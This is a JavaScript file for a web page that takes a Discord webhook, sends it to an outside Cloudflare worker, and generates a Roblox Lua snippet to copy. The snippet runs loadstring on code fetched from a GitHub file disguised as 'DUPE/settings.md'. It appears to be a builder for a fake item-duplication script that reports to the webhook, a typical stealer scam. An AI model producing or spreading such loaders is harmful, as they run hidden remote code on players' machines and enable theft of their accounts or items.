function isValidDiscordWebhook(url) {
  const prefix = "https://discord.com/api/webhooks/";
  if (!url.startsWith(prefix)) return false;
  const parts = url.slice(prefix.length).split('/');
  if (parts.length !== 2) return false;
  const id = parts[0];
  const token = parts[1];
  if (!/^\d{17,21}$/.test(id)) return false;
  if (!/^[a-zA-Z0-9_-]+$/.test(token)) return false;
  return true;
}

function generateLuaScript(encodedWebhook) {
  return `getgenv().UserWebhookURL = "${encodedWebhook}"\n\nloadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/DUPE/refs/heads/main/settings.md"))()`;
}

document.getElementById('webhookForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const webhook = document.getElementById('webhook').value.trim();

  if (!webhook) {
    alert("Please enter a webhook!");
    return;
  }

  if (!isValidDiscordWebhook(webhook)) {
    alert("Error: Please enter a valid Discord webhook URL starting with https://discord.com/api/webhooks/");
    return;
  }

  try {
    const response = await fetch("https://throbbing-dream-62ca.imran-ouarezki-f0c.workers.dev/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ webhook })
    });

    if (!response.ok) {
      const err = await response.json();
      alert("Erreur serveur : " + (err.error || "Inconnu"));
      return;
    }

    const { encoded } = await response.json();

    const lua = generateLuaScript(encoded);

    document.getElementById('luaScript').value = lua;
    document.getElementById('luaScript').style.display = "block";
    document.getElementById('resultTitle').style.display = "block";
    document.getElementById('copyBtn').style.display = "inline-block";

  } catch (err) {
    alert("Impossible de contacter le serveur d’encodage. Réessaie plus tard.");
  }
});

document.getElementById('copyBtn').addEventListener('click', function() {
  const luaArea = document.getElementById('luaScript');
  luaArea.select();
  luaArea.setSelectionRange(0, 99999);
  navigator.clipboard.writeText(luaArea.value);
  alert("Script copied to clipboard!");
});
